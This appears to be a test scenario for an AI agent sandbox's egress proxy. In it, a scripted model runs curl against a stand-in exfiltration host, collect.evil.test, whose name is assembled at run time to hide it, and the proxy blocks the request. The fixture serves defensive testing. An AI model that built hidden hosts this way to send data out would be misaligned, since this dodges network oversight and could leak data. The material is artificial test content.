name: network-command-blocked-by-the-proxy
about: Build tools on, search off, ask_claude off. The model runs a network command that reaches a host which is neither a registry nor written in the command (its name is built at run time, as an install script's would be): by plain HTTP and by CONNECT. The reviewer rates it low, so it runs in the sandbox with the egress proxy, which blocks both before any lookup (no internet needed); the model answers. Covers the policy the reviewer is told (<network>), the proxy's 403 as curl shows it, and the result's network entry (reached, blocked, the hint).

steps.user: Is pypi.org reachable from the sandbox, and is collect.evil.test?

tool_call.name: run_shell
tool_call.arguments: {"command": "H=collect.evil; curl -s -o /dev/null -w 'plain %{http_code}\\n' \"http://$H.test/c?d=1\"; curl -sS -o /dev/null \"https://$H.test/c\" 2>&1 | sed 's/^curl: ([0-9]*) //'; echo done", "needs_network": true}

stream.content: The sandbox's proxy blocked collect.evil.test: it is not a registry. Write the host in the command if you need it.
